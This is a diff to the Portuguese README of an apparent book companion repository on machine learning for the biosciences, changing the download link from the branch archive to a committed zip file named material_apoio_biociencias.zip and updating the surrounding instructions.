@@ -7,10 +7,10 @@ pelos mesmos capítulos e nomes de ficheiros usados no livro.
 
 ## Descarregar e começar
 
-**[Descarregar os materiais](https://github.com/cila-a11y/aprendizagem-automatica-biociencias/archive/refs/heads/main.zip)**
+**[Descarregar o pacote completo](https://github.com/cila-a11y/aprendizagem-automatica-biociencias/raw/refs/heads/main/material_apoio_biociencias.zip)**
 
-A ligação descarrega um ZIP com os materiais do repositório.
-Descompacte-o e conserve a organização das pastas. Comece por
+A ligação descarrega `material_apoio_biociencias.zip`, o pacote referido no
+livro. Descompacte-o e conserve a organização das pastas. Comece por
 [LEIA-ME.txt](LEIA-ME.txt) e siga a sequência de [COMANDOS.txt](COMANDOS.txt)
 para o capítulo pretendido. Esses ficheiros incluem instruções para o
 computador local e para o Google Colab.
